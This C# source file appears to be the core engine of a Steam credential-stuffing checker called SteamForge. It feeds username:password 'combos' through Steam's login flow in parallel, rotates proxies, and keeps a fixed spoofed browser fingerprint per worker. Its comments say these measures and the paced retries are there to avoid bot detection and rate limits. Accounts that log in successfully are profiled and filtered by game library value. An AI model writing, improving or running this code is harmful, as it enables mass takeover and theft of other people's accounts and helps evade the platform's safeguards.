using System.Collections.Concurrent;
using System.Diagnostics;
using System.Threading.Channels;
using SteamForge.Core.Auth;
using SteamForge.Core.Models;
using SteamForge.Core.Output;
using SteamForge.Core.Proxy;

namespace SteamForge.Core.Engine;

public sealed class EngineOptions
{
    public required IReadOnlyList<Combo> Combos { get; init; }
    public AuthMode Mode { get; init; } = AuthMode.WebApiProtobuf;
    public int Workers { get; init; } = 25;
    public int MaxRetries { get; init; } = 3;
    public TimeSpan SubmitDelay { get; init; } = TimeSpan.FromMilliseconds(400);
    public TimeSpan RequestTimeout { get; init; } = TimeSpan.FromSeconds(20);
    public ProxyPool? Pool { get; init; }
    public bool RequireProxy => Pool is not null && Pool.Count > 0;
    public bool Enrich { get; init; } = true;
    public bool EnrichGuardLocked { get; init; } = true;
    public bool NotableFilter { get; init; }
    public int MinNotableGames { get; init; } = 1;
    public int MinGameCount { get; init; }
    public int MinLevel { get; init; }
    public ResultWriter? Writer { get; init; }
    public SessionState? Session { get; init; }
    public string OutputDirectory { get; init; } = "output";
    public TimeSpan StatsFlushInterval { get; init; } = TimeSpan.FromSeconds(5);
    public Func<bool>? PauseGate { get; init; }
}

public sealed class EngineStats
{
    private int _total, _processed, _valid, _guard, _invalid, _notFound, _rateLimited, _errors, _retries, _filtered;

    public int Total => Volatile.Read(ref _total);
    public int Processed => Volatile.Read(ref _processed);
    public int Valid => Volatile.Read(ref _valid);
    public int GuardLocked => Volatile.Read(ref _guard);
    public int Invalid => Volatile.Read(ref _invalid);
    public int NotFound => Volatile.Read(ref _notFound);
    public int RateLimited => Volatile.Read(ref _rateLimited);
    public int Errors => Volatile.Read(ref _errors);
    public int Retries => Volatile.Read(ref _retries);
    public int Filtered => Volatile.Read(ref _filtered);

    public int Remaining => Math.Max(0, Total - Processed);
    public double Progress => Total == 0 ? 0 : (double)Processed / Total * 100.0;

    public void SetTotal(int n) => Volatile.Write(ref _total, n);

    // A resume starts from the session's own tallies: Processed is re-derived from the
    // done-set (ground truth, since rows can be filtered out of the outputs), and the
    // status counters come across so a resumed run does not report zeros for work
    // already finished.
    internal void SeedFrom(SessionState s)
    {
        Volatile.Write(ref _processed, s.DoneCount);
        Volatile.Write(ref _valid, s.Valid);
        Volatile.Write(ref _guard, s.GuardLocked);
        Volatile.Write(ref _invalid, s.Invalid);
        Volatile.Write(ref _notFound, s.NotFound);
        Volatile.Write(ref _rateLimited, s.RateLimited);
        Volatile.Write(ref _errors, s.Errors);
    }
    internal void OnRetry() => Interlocked.Increment(ref _retries);
    internal void OnFiltered() => Interlocked.Increment(ref _filtered);

    internal void OnResult(CheckResult r)
    {
        Interlocked.Increment(ref _processed);
        switch (r.Status)
        {
            case CheckStatus.Valid: Interlocked.Increment(ref _valid); break;
            case CheckStatus.GuardLocked: Interlocked.Increment(ref _guard); break;
            case CheckStatus.Invalid: Interlocked.Increment(ref _invalid); break;
            case CheckStatus.NotFound: Interlocked.Increment(ref _notFound); break;
            case CheckStatus.RateLimited: Interlocked.Increment(ref _rateLimited); break;
            case CheckStatus.Error: Interlocked.Increment(ref _errors); break;
        }
    }
}

/// <summary>
/// Runs combos through the auth flow with a bounded worker pool.
///
/// Retry policy is verdict-aware: an invalid password is final and consumes nothing, a
/// rate-limit backs the proxy off and retries, and a network error retries on a different
/// proxy. Retrying a definitive verdict would just re-burn the same credential on Steam's
/// side, which is what gets large runs flagged.
/// </summary>
public sealed class CheckEngine
{
    private readonly EngineOptions _opts;
    private readonly EngineStats _stats = new();
    private readonly IReadOnlyList<Combo> _pending;
    private readonly int _resumedCount;

    public EngineStats Stats => _stats;
    public event Action<CheckResult>? OnResult;
    public event Action<string>? OnNotice;

    // Raising a never-subscribed event would throw; this keeps the engine safe either way
    // and gives callers one place to route operational events to the UI.
    private void Notice(string message) => OnNotice?.Invoke(message);

    public CheckEngine(EngineOptions options)
    {
        _opts = options;
        _stats.SetTotal(options.Combos.Count);
        _pending = options.Combos;

        // Resume is decided here rather than in RunAsync so the seeded counters are correct
        // the moment the engine exists — the UI reads Stats before any result lands, and a
        // run that resumes into nothing left to do would otherwise report all zeroes.
        if (options.Session is { } s && s.DoneCount > 0)
        {
            var list = new List<Combo>(options.Combos.Count);
            var skipped = 0;
            foreach (var c in options.Combos)
            {
                if (s.IsDone(c.Username)) skipped++;
                else list.Add(c);
            }

            if (skipped > 0)
            {
                _pending = list;
                _resumedCount = skipped;
                _stats.SeedFrom(s);
            }
        }
    }

    public async Task RunAsync(CancellationToken ct)
    {
        if (_resumedCount > 0)
            Notice($"resume: {_resumedCount} of {_opts.Combos.Count} already checked, {_pending.Count} to go");

        var channel = Channel.CreateBounded<Combo>(new BoundedChannelOptions(Math.Max(64, _opts.Workers * 4))
        {
            SingleWriter = false,
            SingleReader = false,
            FullMode = BoundedChannelFullMode.Wait,
        });

        // Feed the queue with the configured submit delay. The delay is the only pacing
        // control that actually governs Steam-side request rate; worker count alone does not,
        // because each worker's auth flow is several requests long.
        var feeder = Task.Run(async () =>
        {
            foreach (var combo in _pending)
            {
                await channel.Writer.WriteAsync(combo).ConfigureAwait(false);
                if (_opts.SubmitDelay > TimeSpan.Zero)
                    await Task.Delay(_opts.SubmitDelay, ct).ConfigureAwait(false);
            }
            channel.Writer.TryComplete();
        }, ct);

        var workers = Enumerable.Range(0, Math.Max(1, _opts.Workers))
            .Select(_ => Task.Run(() => WorkerLoop(channel.Reader, ct), ct));

        var statsLoop = StatsFlushLoop(ct);

        await Task.WhenAll(workers).ConfigureAwait(false);
        await feeder.ConfigureAwait(false);
        await statsLoop.ConfigureAwait(false);

        _opts.Session?.Save(_opts.OutputDirectory);
    }

    private async Task StatsFlushLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                await Task.Delay(_opts.StatsFlushInterval, ct).ConfigureAwait(false);
            }
            catch (OperationCanceledException)
            {
                return;
            }

            if (_opts.Session is { } s)
            {
                s.Processed = _stats.Processed;
                s.Valid = _stats.Valid;
                s.GuardLocked = _stats.GuardLocked;
                s.Invalid = _stats.Invalid;
                s.NotFound = _stats.NotFound;
                s.RateLimited = _stats.RateLimited;
                s.Errors = _stats.Errors;
                s.Save(_opts.OutputDirectory);
            }
        }
    }

    private async Task WorkerLoop(ChannelReader<Combo> reader, CancellationToken ct)
    {
        // Sticky fingerprint per worker: a real browser keeps one identity for a session.
        // Re-rolling the UA per request is itself a bot signal.
        var fp = Fingerprint.Random();

        while (await reader.WaitToReadAsync(ct).ConfigureAwait(false))
        {
            while (reader.TryRead(out var combo))
            {
                if (ct.IsCancellationRequested) return;

                // Cooperative pause — the UI's Start/Stop toggle uses this.
                while (_opts.PauseGate?.Invoke() == false)
                {
                    if (ct.IsCancellationRequested) return;
                    await Task.Delay(250, ct).ConfigureAwait(false);
                }

                var result = await CheckOneAsync(combo, fp, ct).ConfigureAwait(false);

                bool filtered = _opts.NotableFilter && result.Status == CheckStatus.Valid &&
                                !PassesValueFilter(result);

                _stats.OnResult(result);
                if (filtered) _stats.OnFiltered();

                // Marked even when the row is filtered out of the outputs — it was checked,
                // and a resume must not check it a second time.
                _opts.Session?.MarkDone(combo.Username);

                if (!filtered)
                {
                    _opts.Writer?.Write(result);
                    if (_opts.Session is { } s) s.Processed = _stats.Processed;
                }

                OnResult?.Invoke(result);
            }
        }
    }

    private bool PassesValueFilter(CheckResult r)
    {
        var p = r.Profile;
        if (p is null) return _opts.MinGameCount <= 0;

        if (_opts.MinNotableGames > 0 && NotableGames.NotableCount(p.Games) < _opts.MinNotableGames)
            return false;
        if (_opts.MinGameCount > 0 && p.GameCount < _opts.MinGameCount)
            return false;
        if (_opts.MinLevel > 0 && p.Level < _opts.MinLevel)
            return false;
        return true;
    }

    private async Task<CheckResult> CheckOneAsync(Combo combo, Fingerprint fp, CancellationToken ct)
    {
        var sw = Stopwatch.StartNew();
        ProxyEntry? proxy = null;
        string? proxyDisplay = null;

        if (_opts.RequireProxy)
        {
            proxy = _opts.Pool!.Next();
            if (proxy is null)
            {
                // Pool exhausted — everything is cooling or dead. Surface it instead of
                // burning direct connections the operator never consented to.
                return new CheckResult
                {
                    Combo = combo,
                    Status = CheckStatus.Error,
                    FailureReason = "proxy pool exhausted (all cooling or dead)",
                    Mode = _opts.Mode,
                    Elapsed = sw.Elapsed,
                };
            }
            proxyDisplay = proxy.Display;
        }

        int attempts = 0;
        CredentialOutcome outcome;

        while (true)
        {
            attempts++;
            outcome = await RunAuthAsync(combo, proxy, fp, ct).ConfigureAwait(false);

            if (outcome.Status is CheckStatus.RateLimited or CheckStatus.Error)
            {
                if (proxy is not null)
                {
                    bool wasDead = proxy.IsDead;
                    _opts.Pool!.MarkFailure(proxy, BackoffFor(attempts));

                    // A proxy that just crossed into retirement is worth surfacing — otherwise
                    // the pool silently shrinks and throughput drops with no visible cause.
                    if (proxy.IsDead && !wasDead)
                        Notice($"proxy retired after repeated failures: {proxy.Display}");
                }

                if (outcome.Status == CheckStatus.RateLimited)
                    Notice($"rate limited (attempt {attempts}/{_opts.MaxRetries}), backing off {BackoffFor(attempts).TotalSeconds:0.#}s");

                if (attempts >= _opts.MaxRetries) break;

                _stats.OnRetry();
                if (_opts.SubmitDelay > TimeSpan.Zero)
                    await Task.Delay(BackoffFor(attempts), ct).ConfigureAwait(false);
                continue;
            }

            // A definitive verdict earns the proxy a pass.
            if (proxy is not null) _opts.Pool!.MarkSuccess(proxy, (long)sw.ElapsedMilliseconds);
            break;
        }

        AccountProfile? profile = null;
        if (outcome.Status == CheckStatus.Valid && _opts.Enrich && outcome.AccessToken is not null)
        {
            profile = await EnrichAsync(outcome, proxy, ct).ConfigureAwait(false);
        }
        else if (outcome.Status == CheckStatus.GuardLocked && _opts.EnrichGuardLocked && outcome.SteamId != 0)
        {
            profile = await EnrichPublicAsync(outcome, proxy, ct).ConfigureAwait(false);
        }

        return new CheckResult
        {
            Combo = combo,
            Status = outcome.Status,
            Guard = outcome.Guard,
            Mode = _opts.Mode,
            ProxyUsed = proxyDisplay,
            SteamId = outcome.SteamId != 0 ? outcome.SteamId : profile?.SteamId ?? 0,
            Profile = profile,
            FailureReason = outcome.Reason,
            Attempts = attempts,
            Elapsed = sw.Elapsed,
        };
    }

    private async Task<CredentialOutcome> RunAuthAsync(Combo combo, ProxyEntry? proxy, Fingerprint fp, CancellationToken ct)
    {
        switch (_opts.Mode)
        {
            case AuthMode.NativeSteamKit:
            {
                using var native = new NativeSteamAuth();
                return await native.CheckAsync(combo.Username, combo.Password, null, ct).ConfigureAwait(false);
            }
            default:
            {
                using var client = SteamWebAuthClient.Create(proxy, _opts.Mode, fp, _opts.RequestTimeout);
                return await client.CheckAsync(combo.Username, combo.Password, ct).ConfigureAwait(false);
            }
        }
    }

    private async Task<AccountProfile?> EnrichAsync(CredentialOutcome outcome, ProxyEntry? proxy, CancellationToken ct)
    {
        try
        {
            // Enrichment rides the same proxy as the auth so the token's IP and the
            // request IP agree.
            using var handler = HttpFactory.Create(proxy, TimeSpan.FromSeconds(25));
            using var http = new HttpClient(handler, disposeHandler: true) { Timeout = TimeSpan.FromSeconds(25) };
            var api = new SteamApi(http);
            return await api.EnrichAsync(outcome.AccessToken!, outcome.SteamId, ct).ConfigureAwait(false);
        }
        catch
        {
            return null;
        }
    }

    private async Task<AccountProfile?> EnrichPublicAsync(CredentialOutcome outcome, ProxyEntry? proxy, CancellationToken ct)
    {
        try
        {
            using var handler = HttpFactory.Create(proxy, TimeSpan.FromSeconds(20));
            using var http = new HttpClient(handler, disposeHandler: true) { Timeout = TimeSpan.FromSeconds(20) };
            var api = new SteamApi(http);
            return await api.EnrichPublicAsync(outcome.SteamId, ct).ConfigureAwait(false);
        }
        catch
        {
            return null;
        }
    }

    private static TimeSpan BackoffFor(int attempt)
    {
        // Exponential with jitter. Linear backoff produces synchronized retry waves across
        // the worker pool, which is exactly the pattern that triggers throttling.
        var baseMs = Math.Min(8000, 400 * Math.Pow(2, attempt - 1));
        var jitter = Random.Shared.NextDouble() * 0.35 + 0.85;
        return TimeSpan.FromMilliseconds(baseMs * jitter);
    }
}
